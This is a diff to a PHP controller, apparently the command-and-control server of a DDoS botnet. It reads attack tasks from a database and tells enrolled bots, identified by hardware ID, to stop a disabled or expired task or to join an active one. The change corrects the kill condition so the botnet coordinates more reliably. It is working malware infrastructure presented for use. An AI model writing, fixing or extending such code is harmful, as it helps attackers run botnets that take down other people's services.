@@ -26,12 +26,15 @@ class ddosHandlerController{
             $statement = $GLOBALS["pdo"]->prepare("SELECT *, if(executed_at >= (CURRENT_TIMESTAMP() + maxtime), 'expired','active') as timelimit FROM ddos_tasks ");
             $statement->execute(array());
             while($task = $statement->fetch()) {
-                if($task["status"] != "active" && $_POST["taskid"] == $task["id"] || $task["timelimit"] == "expired" ){
+                if($task["status"] != "active" || $task["timelimit"] == "expired" ){
                     //Kill if it is Disabled Ignore if it is not working on the Task
-                    echo "kill";
-                    $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
-                    $statement->execute(array(time(), "",  "none",$_POST["hwid"]));
-                    die();
+                    if($_POST["taskid"] == $task["id"]){
+                        echo "kill";
+                        $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
+                        $statement->execute(array(time(), "",  "none",$_POST["hwid"]));
+                        die();
+                    }
+                    continue;
                 }else{
                     if($task["status"] == "active" && intval($_POST["taskrunning"]) != 1 ){
                         //Task is Active invite bot for Working
